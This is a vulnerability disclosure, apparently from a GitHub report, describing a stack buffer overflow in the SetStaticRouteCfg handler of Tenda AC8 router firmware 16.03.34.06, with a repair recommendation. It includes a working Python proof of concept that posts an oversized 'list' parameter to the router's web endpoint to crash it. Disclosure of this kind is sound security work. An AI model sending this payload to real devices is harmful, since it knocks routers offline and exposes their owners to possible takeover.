# **AC8 US_AC8V4.0si_V16.03.34.06_cn_TDC01 SetStaticRouteCfg Buffer Overflow Vulnerability**

## **Vulnerability Description**
<img width="1914" height="885" alt="image" src="https://github.com/user-attachments/assets/4f680811-aac9-425a-8b1e-b1dc6c41db07" />

A stack overflow vulnerability exists in the `SetStaticRouteCfg` function of the Tenda AC8 router firmware version 16.03.34.06 (updated 2024-11-29). Attackers can exploit this vulnerability to achieve denial of service or remote code execution attacks.

**【Download Link】**
https://www.tenda.com.cn/download/detail-3518.html

**【Update Date】**
2024-11-29

## **Analysis and Verification**
The vulnerability is triggered by passing a payload through the `list` parameter in the HTTP request body. The vulnerable point is located within the `save_staticroute_data` function.
<img width="827" height="548" alt="image" src="https://github.com/user-attachments/assets/cdef7dbc-ee92-4cb7-b9de-f9a9c988d527" />
<img width="1307" height="1108" alt="image" src="https://github.com/user-attachments/assets/ef5e9d27-c7bc-460f-81be-d73d1f95ae78" />

In this function, `sscanf` reads data from `v5` and stores it into the `v15`, `v16`, `v17`, and `v18` buffers. Due to the lack of length restrictions, this leads to a buffer overflow condition. Execution of the PoC causes the program to crash.
<img width="1302" height="303" alt="image" src="https://github.com/user-attachments/assets/aa850903-5454-4567-8653-8b1b71d277b5" />

## **PoC**

python

```
import requests

url = "http://192.168.67.135/goform/SetStaticRouteCfg"
data = {
    "list": "a" * 512
}
res = requests.post(url=url, data=data)
print(res.content)
```



## **Repair Recommendation**
Implement restrictions on the length of bytes read into the buffers.
